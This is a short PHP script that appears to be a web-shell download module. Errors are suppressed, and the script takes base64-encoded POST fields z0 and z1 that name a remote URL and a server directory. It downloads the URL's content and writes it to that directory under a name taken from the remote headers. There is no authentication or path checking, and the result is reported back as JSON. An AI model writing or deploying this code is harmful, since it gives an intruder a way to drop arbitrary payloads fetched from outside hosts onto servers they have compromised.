<?php

error_reporting(0);
@ini_set('display_errors', '0');
@set_time_limit(0);

$url = isset($_POST['z0']) ? base64_decode($_POST['z0']) : '';
$save_dir = isset($_POST['z1']) ? base64_decode($_POST['z1']) : '';

$filename = null;

if (!empty($url)) {
    $headers = get_headers($url, true);

    if ($headers !== false) {
        $headers_lowercase = array_change_key_case($headers, CASE_LOWER);

        if (isset($headers_lowercase['content-disposition'])) {
            $disposition = $headers_lowercase['content-disposition'];
            if (is_array($disposition)) {
                $disposition = end($disposition);
            }
            if (preg_match('/filename="?([^"]+)"?/i', $disposition, $m)) {
                $filename = $m[1];
            }
        }
    }
}

if (!$filename && !empty($url)) {
    $path = parse_url($url, PHP_URL_PATH);
    $filename = basename($path);
}

if (!$filename || $filename === '/') {
    $filename = 'download.bin';
}

$filePath = rtrim($save_dir, '/') . '/' . $filename;
$data = file_get_contents($url);

if ($data === false) {
    echo json_encode(array(
        'success' => false,
        'error' => 'Download failed or allow_url_fopen is disabled'
    ));
    exit;
}

file_put_contents($filePath, $data);

echo json_encode(array(
    'success' => true,
    'filename' => $filename,
    'path' => $filePath
));

?>